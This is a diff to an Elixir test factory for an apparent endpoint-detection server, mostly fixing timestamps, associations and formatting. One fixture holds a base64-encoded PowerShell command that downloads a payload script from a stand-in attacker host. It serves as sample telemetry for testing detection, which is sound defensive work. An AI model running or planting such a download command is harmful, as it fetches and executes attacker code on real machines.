@@ -6,6 +6,7 @@ defmodule TamanduaServer.Factory do
 
   use ExMachina.Ecto, repo: TamanduaServer.Repo
 
+  alias TamanduaServer.Repo
   alias TamanduaServer.Accounts.{Organization, User}
   alias TamanduaServer.Agents.{Agent, AgentCredential}
   alias TamanduaServer.Alerts.Alert
@@ -22,11 +23,13 @@ defmodule TamanduaServer.Factory do
 
   # ExMachina factories
   def organization_factory do
+    # NOTE: do not set inserted_at/updated_at here. The organizations schema
+    # uses :utc_datetime_usec timestamps, and second-truncated values make
+    # Ecto raise "expects microsecond precision" on insert. Letting Ecto
+    # autogenerate them is always correct.
     %Organization{
       name: Faker.Company.name(),
-      slug: Faker.Internet.slug(),
-      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
-      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
+      slug: Faker.Internet.slug()
     }
   end
 
@@ -38,8 +41,8 @@ defmodule TamanduaServer.Factory do
       role: "analyst",
       is_active: true,
       organization: build(:organization),
-      inserted_at: DateTime.utc_now() |> DateTime.truncate(:second),
-      updated_at: DateTime.utc_now() |> DateTime.truncate(:second)
+      inserted_at: DateTime.utc_now() |> DateTime.truncate(:microsecond),
+      updated_at: DateTime.utc_now() |> DateTime.truncate(:microsecond)
     }
   end
 
@@ -116,7 +119,8 @@ defmodule TamanduaServer.Factory do
     %Alert{
       severity: "critical",
       title: "ETW Function Patched: NtTraceEvent (xor_eax_ret)",
-      description: "ETW tampering detected - a process has attempted to patch critical Windows tracing functions to evade EDR telemetry collection.",
+      description:
+        "ETW tampering detected - a process has attempted to patch critical Windows tracing functions to evade EDR telemetry collection.",
       status: "new",
       source_event_id: Ecto.UUID.generate(),
       event_ids: [Ecto.UUID.generate()],
@@ -261,6 +265,7 @@ defmodule TamanduaServer.Factory do
 
   def build(:process_event, attrs) do
     pid = :rand.uniform(65535)
+
     build(:event, %{
       event_type: "process_create",
       payload: %{
@@ -280,6 +285,7 @@ defmodule TamanduaServer.Factory do
 
   def build(:suspicious_process_event, attrs) do
     pid = :rand.uniform(65535)
+
     build(:event, %{
       event_type: "process_create",
       payload: %{
@@ -287,7 +293,8 @@ defmodule TamanduaServer.Factory do
         "ppid" => :rand.uniform(65535),
         "name" => "powershell.exe",
         "path" => "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "cmdline" => "-enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
+        "cmdline" =>
+          "-enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
         "user" => "SYSTEM",
         "is_elevated" => true,
         "is_signed" => true,
@@ -346,12 +353,13 @@ defmodule TamanduaServer.Factory do
     agent_id = attrs[:agent_id] || Ecto.UUID.generate()
     event_count = attrs[:event_count] || 5
 
-    events = Enum.map(1..event_count, fn _ ->
-      build(:process_event, %{agent_id: agent_id})
-      |> Map.from_struct()
-      |> Map.take([:id, :event_type, :timestamp, :payload])
-      |> Map.put(:event_id, Ecto.UUID.generate())
-    end)
+    events =
+      Enum.map(1..event_count, fn _ ->
+        build(:process_event, %{agent_id: agent_id})
+        |> Map.from_struct()
+        |> Map.take([:id, :event_type, :timestamp, :payload])
+        |> Map.put(:event_id, Ecto.UUID.generate())
+      end)
 
     %{
       agent_id: agent_id,
@@ -375,7 +383,16 @@ defmodule TamanduaServer.Factory do
   """
   def create_agent_with_org(attrs \\ %{}) do
     org = insert!(:organization)
-    agent = insert!(:agent, Map.put(attrs, :organization_id, org.id))
+
+    # Pass the persisted org as the association (not organization_id):
+    # agent_factory defaults `organization: build(:organization)`, and Ecto
+    # rejects inserts that set both a belongs_to struct and its foreign key.
+    agent =
+      insert!(
+        :agent,
+        attrs |> Map.delete(:organization_id) |> Map.put(:organization, org)
+      )
+
     {org, agent}
   end
 
@@ -439,13 +456,14 @@ defmodule TamanduaServer.Factory do
     %TamanduaServer.Detection.IOC{
       id: Ecto.UUID.generate(),
       type: Enum.random(["hash_sha256", "hash_md5", "ip", "domain", "url"]),
-      value: case Enum.random(["hash_sha256", "hash_md5", "ip", "domain", "url"]) do
-        "hash_sha256" -> :crypto.strong_rand_bytes(32) |> Base.encode16(case: :lower)
-        "hash_md5" -> :crypto.strong_rand_bytes(16) |> Base.encode16(case: :lower)
-        "ip" -> Faker.Internet.ip_v4_address()
-        "domain" -> Faker.Internet.domain_name()
-        "url" -> Faker.Internet.url()
-      end,
+      value:
+        case Enum.random(["hash_sha256", "hash_md5", "ip", "domain", "url"]) do
+          "hash_sha256" -> :crypto.strong_rand_bytes(32) |> Base.encode16(case: :lower)
+          "hash_md5" -> :crypto.strong_rand_bytes(16) |> Base.encode16(case: :lower)
+          "ip" -> Faker.Internet.ip_v4_address()
+          "domain" -> Faker.Internet.domain_name()
+          "url" -> Faker.Internet.url()
+        end,
       description: Faker.Lorem.sentence(),
       enabled: true,
       source: "test_factory",
@@ -557,7 +575,8 @@ defmodule TamanduaServer.Factory do
     %TamanduaServer.Notifications.Integration{
       id: Ecto.UUID.generate(),
       name: "Test #{Enum.random(["Slack", "Teams", "Email"])} Integration",
-      provider: Enum.random(["slack", "teams", "email", "pagerduty", "opsgenie", "discord", "telegram"]),
+      provider:
+        Enum.random(["slack", "teams", "email", "pagerduty", "opsgenie", "discord", "telegram"]),
       enabled: true,
       config: %{
         webhook_url: "https://hooks.example.com/services/test"
